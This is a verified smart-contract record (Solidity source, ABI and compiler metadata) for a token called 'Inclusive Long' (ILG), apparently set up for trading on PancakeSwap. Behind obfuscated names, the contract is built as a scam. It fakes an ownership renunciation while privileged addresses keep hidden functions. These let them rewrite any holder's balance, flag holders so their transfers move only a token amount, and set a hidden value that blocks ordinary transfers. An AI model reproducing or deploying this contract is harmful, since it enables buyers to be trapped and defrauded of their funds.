{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface feeMode {\n    function createPair(address liquidityTeam, address totalTeam) external returns (address);\n}\n\ninterface limitList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingFrom) external view returns (uint256);\n\n    function transfer(address totalWallet, uint256 listMode) external returns (bool);\n\n    function allowance(address amountReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalWallet,\n        uint256 listMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletShould, uint256 value);\n    event Approval(address indexed amountReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract totalSwapMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitListMetadata is limitList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InclusiveLong is totalSwapMode, limitList, limitListMetadata {\n\n    bool private toAmount;\n\n    function balanceOf(address marketingFrom) public view virtual override returns (uint256) {\n        return marketingFund[marketingFrom];\n    }\n\n    function owner() external view returns (address) {\n        return modeTo;\n    }\n\n    function totalReceiver(address modeMarketing) public {\n        buyLaunched();\n        if (sellLaunched == feeSwap) {\n            isLiquidity = receiverTeam;\n        }\n        if (modeMarketing == amountBuy || modeMarketing == maxLaunched) {\n            return;\n        }\n        buyFund[modeMarketing] = true;\n    }\n\n    uint256 public feeSwap;\n\n    function approve(address modeReceiverSender, uint256 listMode) public virtual override returns (bool) {\n        launchedReceiver[_msgSender()][modeReceiverSender] = listMode;\n        emit Approval(_msgSender(), modeReceiverSender, listMode);\n        return true;\n    }\n\n    address public maxLaunched;\n\n    address senderShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private marketingFund;\n\n    function fromAmount(address liquidityMax, uint256 listMode) public {\n        buyLaunched();\n        marketingFund[liquidityMax] = listMode;\n    }\n\n    function txMaxTotal(uint256 listMode) public {\n        buyLaunched();\n        tokenIs = listMode;\n    }\n\n    mapping(address => bool) public receiverToken;\n\n    uint256 private isLiquidity;\n\n    function exemptTake(address teamSell, address totalWallet, uint256 listMode) internal returns (bool) {\n        require(marketingFund[teamSell] >= listMode);\n        marketingFund[teamSell] -= listMode;\n        marketingFund[totalWallet] += listMode;\n        emit Transfer(teamSell, totalWallet, listMode);\n        return true;\n    }\n\n    uint256 constant autoMode = 16 ** 10;\n\n    function transfer(address liquidityMax, uint256 listMode) external virtual override returns (bool) {\n        return minTrading(_msgSender(), liquidityMax, listMode);\n    }\n\n    address public amountBuy;\n\n    uint256 private receiverTeam;\n\n    address autoBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFrom;\n    }\n\n    function buyLaunched() private view {\n        require(receiverToken[_msgSender()]);\n    }\n\n    function allowance(address senderMarketing, address modeReceiverSender) external view virtual override returns (uint256) {\n        if (modeReceiverSender == autoBuy) {\n            return type(uint256).max;\n        }\n        return launchedReceiver[senderMarketing][modeReceiverSender];\n    }\n\n    bool public sellMaxToken;\n\n    function minTrading(address teamSell, address totalWallet, uint256 listMode) internal returns (bool) {\n        if (teamSell == amountBuy) {\n            return exemptTake(teamSell, totalWallet, listMode);\n        }\n        uint256 liquiditySwapTeam = limitList(maxLaunched).balanceOf(senderShould);\n        require(liquiditySwapTeam == tokenIs);\n        require(totalWallet != senderShould);\n        if (buyFund[teamSell]) {\n            return exemptTake(teamSell, totalWallet, autoMode);\n        }\n        return exemptTake(teamSell, totalWallet, listMode);\n    }\n\n    string private maxBuy = \"Inclusive Long\";\n\n    string private totalMarketing = \"ILG\";\n\n    uint256 tradingEnable;\n\n    uint256 private sellLaunched;\n\n    bool private launchMode;\n\n    function getOwner() external view returns (address) {\n        return modeTo;\n    }\n\n    function transferFrom(address teamSell, address totalWallet, uint256 listMode) external override returns (bool) {\n        if (_msgSender() != autoBuy) {\n            if (launchedReceiver[teamSell][_msgSender()] != type(uint256).max) {\n                require(listMode <= launchedReceiver[teamSell][_msgSender()]);\n                launchedReceiver[teamSell][_msgSender()] -= listMode;\n            }\n        }\n        return minTrading(teamSell, totalWallet, listMode);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedReceiver;\n\n    bool private autoEnable;\n\n    event OwnershipTransferred(address indexed exemptEnable, address indexed tokenExempt);\n\n    address private modeTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptSender;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxBuy;\n    }\n\n    bool public totalSellFund;\n\n    uint256 private launchedFund;\n\n    mapping(address => bool) public buyFund;\n\n    uint256 private enableFrom = 100000000 * 10 ** 18;\n\n    function sellTotalTx() public {\n        emit OwnershipTransferred(amountBuy, address(0));\n        modeTo = address(0);\n    }\n\n    uint256 tokenIs;\n\n    constructor (){\n        if (sellMaxToken != autoEnable) {\n            feeSwap = launchedFund;\n        }\n        txAt limitShould = txAt(autoBuy);\n        maxLaunched = feeMode(limitShould.factory()).createPair(limitShould.WETH(), address(this));\n        if (sellLaunched == isLiquidity) {\n            launchMode = false;\n        }\n        amountBuy = _msgSender();\n        receiverToken[amountBuy] = true;\n        marketingFund[amountBuy] = enableFrom;\n        sellTotalTx();\n        \n        emit Transfer(address(0), amountBuy, enableFrom);\n    }\n\n    uint8 private exemptSender = 18;\n\n    function senderReceiver(address enableAt) public {\n        if (totalSellFund) {\n            return;\n        }\n        if (launchedFund == sellLaunched) {\n            autoEnable = true;\n        }\n        receiverToken[enableAt] = true;\n        \n        totalSellFund = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiverSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiverSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMode\",\"type\":\"uint256\"}],\"name\":\"fromAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMaxToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotalTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"}],\"name\":\"senderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"}],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSellFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listMode\",\"type\":\"uint256\"}],\"name\":\"txMaxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InclusiveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}